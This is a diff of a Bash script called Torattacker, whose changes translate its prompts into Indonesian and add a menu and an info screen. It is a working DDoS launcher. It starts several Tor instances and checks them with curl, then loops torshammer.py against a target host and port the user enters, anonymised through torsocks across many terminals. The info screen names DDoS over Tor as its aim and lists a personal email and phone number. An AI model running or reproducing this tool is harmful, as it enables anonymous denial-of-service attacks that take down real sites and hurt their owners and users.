@@ -1,42 +1,58 @@
-#!/data/data/com.termux/files/usr/bin/bash
+#!/usr/bin/bash
 # Torattacker
-# Coded by Senja
+# Coded by Nedi Senja
 # Github: https://github.com/stepbystepexe/Torattacker
-clear
-reset
-trap 'printf "\n";stop;exit 1' 2
+trap 'echo;stop;exit 1;' 2
 checkroot(){
 if [[ "$(id -u)" -ne 0 ]]; then
-   printf "\e[0m[\e[1;91m!\e[0m] \e[1;77mPlease, run this program as root!\n\n\e[0m"
+   printf "\e[0m[\e[1;91m!\e[0m] \e[1;77mMohon, jalankan program root!\n\n\e[0m"
    exit 1
 fi
 }
+clearscreen(){
+    clear
+    reset
+    sleep 1
+}
 dependencies(){
-    command -v tor > /dev/null 2>&1 || { echo >&2 "I require tor but it's not installed. Run ./install.sh. Aborting."; exit 1; }
-    command -v curl > /dev/null 2>&1 || { echo >&2 "I require curl but it's not installed. Run ./install.sh. Aborting."; exit 1; }
-    command -v openssl > /dev/null 2>&1 || { echo >&2 "I require openssl but it's not installed. Run ./install.sh Aborting."; exit 1; }
-    command -v bash > /dev/null 2>&1 || { echo >&2 "I require bash but it's not installed. Aborting."; exit 1; }
-    command -v python2 > /dev/null 2>&1 || { echo >&2 "I require python2 but it's not installed. Aborting."; exit 1; }
+    command -v bash > /dev/null 2>&1 || { echo >&2 "Sepertinya paket Bash belum terinstall. Jalankan ./install.sh. sekarang."; exit 1; }
+    command -v curl > /dev/null 2>&1 || { echo >&2 "Sepertinya paket cURL belum terinstall. Jalankan ./install.sh. sekarang."; exit 1; }
+    command -v wget > /dev/null 2>&1 || { echo >&2 "Sepertinya paket Wget belum terinstall. Jalankan ./install.sh. sekarang."; exit 1; }
+    command -v openssl > /dev/null 2>&1 || { echo >&2 "Sepertinya paket Openssl belum terinstall. Jalankan ./install.sh. sekarang."; exit 1; }
+    command -v tor > /dev/null 2>&1 || { echo >&2 "Sepertinya paket TOR belum terinstall. Jalankan ./install.sh. sekarang."; exit 1; }
+    command -v python2 > /dev/null 2>&1 || { echo >&2 "Sepertinya paket Python2 belum terinstall. Jalankan ./install.sh. sekarang."; exit 1; }
+    command -v git > /dev/null 2>&1 || { echo >&2 "Sepertinya paket Git belum terinstall. Jalankan ./install.sh. sekarang."; exit 1; }
     if [ $(ls /dev/urandom >/dev/null; echo $?) == "1" ]; then
-        echo "/dev/urandom not found!"
+        echo "/dev/urandom tidak ditemukan!"
     exit 1
 fi
+}
+load(){
+    echo -e "\n"
+    bar=" >>>>>>>>>>>>>>>>>>> "
+    barlength=${#bar}
+    i=0
+    while((i<100)); do
+        n=$((i*barlength / 100))
+        printf "\r\e[0m[\e[1;32m%-${barlength}s\e[0m]\e[00m" "${bar:0:n}"
+        printf "  \e[1;77mLOADING...!\e[0m "
+        ((i += RANDOM%5+2))
+        sleep 0.2
+    done
 }
 changeip(){
     killall -HUP tor
 }
 banner() {
-    sleep 1
-    printf "\n"
+    echo
     printf "\e[1;35m ▄▄▄▄▄▄▄▄     \e[1;92m█▀\e[0m\n"
     printf "\e[1;35m ▀▀▀██▀▀▀   ▄████▄    ██▄████ \e[0m\e[1;77m  ░░░░░░░░░░░░░░░░░░░░░░░░░\e[0m\n"
     printf "\e[1;35m    ██     ██▀\e[1;37\e[0m██\e[1;95m▀██   ██▀     \e[0m\e[1;77m  ░░░\e[1;91m█▀█\e[0m\e[1;77m░\e[1;91m▀█▀\e[0m\e[1;77m░\e[1;91m█▀█\e[0m\e[1;77m░\e[1;91m█▀▀\e[0m\e[1;77m░\e[1;91m█\e[0m\e[1;77m░\e[1;91m█\e[0m\e[1;77m░░░\e[0m\n"
     printf "\e[1;35m    ██     ██\e[1;37\e[0m████\e[1;95m██   ██      \e[0m\e[1;77m  ░░░\e[1;91m█▀█\e[0m\e[1;77m░░\e[1;91m█\e[0m\e[1;77m░░\e[1;91m█▀█\e[0m\e[1;77m░\e[1;91m█\e[0m\e[1;77m░░░\e[1;91m█▀▄\e[0m\e[1;77m░░░\e[0m\n"
     printf "\e[1;35m    ██     ▀██▄▄██▀   ██      \e[0m\e[1;77m  ░░░\e[1;91m▀\e[0m\e[1;77m░\e[1;91m▀\e[0m\e[1;77m░░\e[1;91m▀\e[0m\e[1;77m░░\e[1;91m▀\e[0m\e[1;77m░\e[1;91m▀\e[0m\e[1;77m░\e[1;91m▀▀▀\e[0m\e[1;77m░\e[1;91m▀\e[0m\e[1;77m░\e[1;91m▀\e[0m\e[1;77m░░░\e[0m\n"
     printf "\e[1;35m    ▀▀       ▀▀▀▀     ▀▀      \e[0m\e[1;77m  ░░░░░░░░░░░░░░░░░░░░░░░░░\e[0m\n"
-    printf "\n"
-    printf "\e[0;100;77;1m[     Tor Attacker v1.0 Beta, Coded by: @stepbyatep     ]\e[0m\n"
-    printf "\n"
+    echo
+    printf "\e[0;100;77;1m[         Tor Attacker, My Github: @stepbystepexe        ]\e[0m\n"
 }
 config(){
     default_portt="80"
@@ -49,12 +65,12 @@ config(){
                 threads="${threads:-${default_threads}}"
                     read -p $'\e[0m[\e[1;95m$\e[0m] \e[1;77mTerminals \e[0m(Default 4): \e[1;77m' inst
                     inst="${inst:-${default_inst}}"
-                        read -e -p $'\e[0m[\e[1;96m&\e[0m] \e[1;77mAnonymized Via \e[0m[ TOR ] \e[1;77m(start tor before) \e[0m[Y/n]: \e[1;77m' tor
+                        read -e -p $'\e[0m[\e[1;96m&\e[0m] \e[1;77mGunakan Via \e[0m[ TOR ] \e[1;77m(mulai tor sekarang) \e[0m[Y/n]: \e[1;77m' tor
                             printf "\e[0m"
                             tor="${tor:-${default_tor}}"
         if [[ $tor == "y" || $tor == "Y" ]]; then
         readinst
-        printf "\e[0m[\e[1;91m!\e[0m] \e[1;77mPress Ctrl + C to stop attack\n"
+        printf "\e[0m[\e[1;91m!\e[0m] \e[1;77mTekan ctrl-c untuk menyetop\n"
         attacktor
     else
         attack
@@ -62,17 +78,15 @@ config(){
 }
 readinst(){
     default_inst="3"
-    read -p $'\e[0m[\e[1;91m/\e[0m] \e[1;77mTor Instances \e[0m(default 3): \e[1;77m' inst
+    read -p $'\e[0m[\e[1;91m/\e[0m] \e[1;77mTor Instansi \e[0m(default 3): \e[1;77m' inst
         inst="${inst:-${default_inst}}"
         multitor
 }
 attacktor(){
-#let i=1
     while true; do
         let ii=1
         while [ $ii -le $inst ]; do
             porttor=$((9050+$ii))
-            #printf "\e[1;92m[*] Attack through Tor Port: %s\e[0m\n" $porttor
             gnome-terminal -- torsocks -P $porttor python torshammer/torshammer.py -t $target -p $portt -r $threads
             ii=$((ii+1))
         done
@@ -86,7 +100,7 @@ attack(){
     default_inst="4"
         read -p $'\e[0m[\e[1;94m+\e[0m] \e[1;77mTerminals \e[0m(Default 4): \e[1;77m' inst
             inst="${inst:-${default_inst}}"
-            printf "\e[0m[\e[1;91m!\e[0m] \e[1;77m Press Ctrl + C to stop attack\n"
+            printf "\e[0m[\e[1;91m!\e[0m] \e[1;77mTekan ctrl-c untuk menyetop\n"
             i=1
         while true; do
             let i=1
@@ -103,12 +117,12 @@ checktor(){
     checkcount=0
         while [[ $i -le $inst ]]; do
             port=$((9050+$i))
-            printf "\e[0m[\e[1;93m*\e[0m] \e[1;77mChecking Tor connection on port:\e[0m %s\e[0m..." $port
+            printf "\e[0mMengecek Tor koneksi dari port:\e[77;1m %s\e[77;1m..." $port
             check=$(curl --socks5-hostname localhost:$port -s https://www.google.com > /dev/null; echo $?)
             if [[ "$check" -gt 0 ]]; then
-                printf "\e[0mFailed!\n"
+                printf "\e[77;1mGagal!\n"
             else
-                printf "\e[0mOk!\n"
+                printf "\e[77;1mOK!\n"
                 let checkcount++
             fi
             i=$((i+1))
@@ -116,30 +130,30 @@ checktor(){
 
     if [[ $checkcount != $inst ]]; then
         echo
-        printf "\e[0m[\e[1;94m1\e[0m] \e[1;77mIt Requires All Tor Running!\n"
-        printf "\e[0m[\e[1;94m2\e[0m] \e[1;77mCheck Again\n"
-        printf "\e[0m[\e[1;94m3\e[0m] \e[1;77mRestart\n"
-        printf "\e[0m[\e[1;94m0\e[0m] \e[1;77mExit\n"
+        printf "\e[0m[\e[1;96;2m1\e[0m] \e[1;77mMulai ulang semua Tor!\n"
+        printf "\e[0m[\e[1;96;2m2\e[0m] \e[1;77mCek Kembali\n"
+        printf "\e[0m[\e[1;96;2m3\e[0m] \e[1;77mMulai ulang\n"
+        printf "\e[0m[\e[1;96;2m0\e[0m] \e[1;77mKeluar\n"
         echo
-        read -p $'\e[0m[\e[1;92m+\e[0m] \e[1;77mChoose an option: \e[0m' fail
-            if [[ $fail == "1" ]]; then
+        read -p $'\e[0m[\e[1;95m/\e[0m] \e[1;77mMasukan opsi: \e[0m' fail
+            if [[ $fail == '1' ]]; then
             checktor
-                elif [[ $fail == "2" ]]; then
+                elif [[ $fail == '2' ]]; then
                 stop
                 multitor
-                    elif [[ $fail == "3" ]]; then
+                    elif [[ $fail == '3' ]]; then
                     clear
-                    reset
+                    clearscreen
                     banner
-                    config
-                        elif [[ $fail == "0" ]]; then
+                    menu
+                        elif [[ $fail == '0' ]]; then
                         echo
-                        printf "\e[0m[\e[1;91m!\e[0m] \e[1;77mExit The Programm!\n"
+                        printf "\e[0m[\e[1;91m!\e[0m] \e[1;77mKeluar dari program!\n"
                         echo
                         exit 1
             else
             echo
-            printf "\e[0m[\e[1;91m!\e[0m] \e[1;77mInvalid Option!\n"
+            printf "\e[0m[=\e[1;41;77m Pilihan Salah \e[0m=]"
             echo
             sleep 1
             clear
@@ -149,6 +163,8 @@ checktor(){
     fi
 }
 multitor(){
+    load
+    echo
     echo
     if [[ ! -d multitor ]]; then
         mkdir multitor;
@@ -158,8 +174,8 @@ multitor(){
     let i=1
         while [[ $i -le $inst ]]; do
             port=$((9050+$i))
-            printf "SOCKSPort %s\nDataDirectory /var/lib/tor%s" $port $i > multitor/multitor$i.
-            printf "\e[0m[\e[1;92m*\e[0m] \e[1;77mStarting Tor On Port:\e[0m 905%s\e[0m\n" $i.
+            printf "SOCKS Port %s\nData Directory /var/lib/tor%s" $port $i > multitor/multitor$i.
+            printf "\e[0mMemulai Tor dari Port:\e[77;1m 905%s\e[77;1m\n" $i.
             tor -f multitor/multitor$i > /dev/null &
             sleep 10
             i=$((i+1))
@@ -169,11 +185,88 @@ checktor
 stop(){
     killall -2 tor > /dev/null 2>&1
     echo
-    printf "\e[0m[\e[1;91m!\e[0m] \e[1;77mAll Tor Connection Stopped.\e[0m\n"
+    printf "\e[0m[\e[1;91m!\e[0m] \e[1;77mSemua Koneksi Tor disetop.\e[0m\n"
     echo
 }
-    #checkroor
-    #checktor
-    #dependencies
+menu(){
+    echo
+    printf "\033[0m[\033[1;96mあ\033[0m] \033[1;77mMulai Menggunakan Torattacker\n"
+    echo
+    printf "\033[0m[\033[93;1m&\033[0m] LISENSI\n"
+    printf "\033[0m[\033[94;1m#\033[0m] Informasi\n"
+    printf "\033[0m[\033[92;1m*\033[0m] Perbarui\n"
+    printf "\033[0m[\033[91;1m-\033[0m] Keluar\n"
+    echo
+        read -p $'\e[0m[\e[1;95m/\e[0m] \e[1;77mMasukan opsi: \e[0m' option
+            if [[ $option == '1' || $option == 'あ' ]]; then
+            echo
+            config
+                elif [[ $option == '2' || $option == '&' ]]; then
+                echo
+                nano LICENSE
+                echo
+                clearscreen
+                banner
+                menu
+                    elif [[ $option == '3' || $option == '#' ]]; then
+                    echo
+                    informasi
+                    echo
+                        elif [[ $option == '4' || $option == '*' ]]; then
+                        echo
+                        git pull origin master
+                        echo
+                        read -p $'\e[0m[\e[92m Tekan Enter \e[0m]'
+                        clearscreen
+                        banner
+                        menu
+                            elif [[ $option == '5' || $option == '-' ]]; then
+                            echo
+                            printf "\e[0m[\e[1;91m!\e[0m] \e[0;1;77mKeluar dari program!\n\e[0m"
+                            echo
+                            exit 1
+            else
+                echo
+                printf "\e[0m[=\e[1;41;77m Pilihan Salah \e[0m=]"
+                echo
+                sleep 1
+                clearscreen
+                banner
+                menu
+        fi
+}
+informasi(){
+clear
+printf "\e[0;100;77;1m[         Tor Attacker, My Github: @stepbyatepexe        ]\e[0m\n"
+toilet -f smslant 'Tor'
+printf "
+Nama        : Torattacker
+Versi       : 4.5 (Update: 23 Februari 2020, 9:30 AM)
+Tanggal     : 12 Agustus 2019
+Author      : Nedi Senja
+Tujuan      : Ddos nenggunakan jaringan TOR
+              atau jaringan bawang
+Terimakasih : Allah SWT.
+              FR13NDS, & seluruh
+              manusia seplanet bumi
+NB          : Manusia gax ada yang sempurna
+              sama kaya tool ini.
+              Silahkan laporkan kritik atau saran
+              Ke - Email: d_q16x@outlook.co.id
+                 - WhatsApp: +62 8577-5433-901
+
+[ \e[4mGunakan tool ini dengan bijak \e[0m]\n"
+sleep 1
+read -p $'\n\n\e[0m[ Tekan Enter ]' opt
+    if [[ $opt = '' ]]; then
+        clearscreen
         banner
-        config
+        menu
+    fi
+}
+#checkroot
+#checktor
+#dependencies
+    clearscreen
+    banner
+    menu
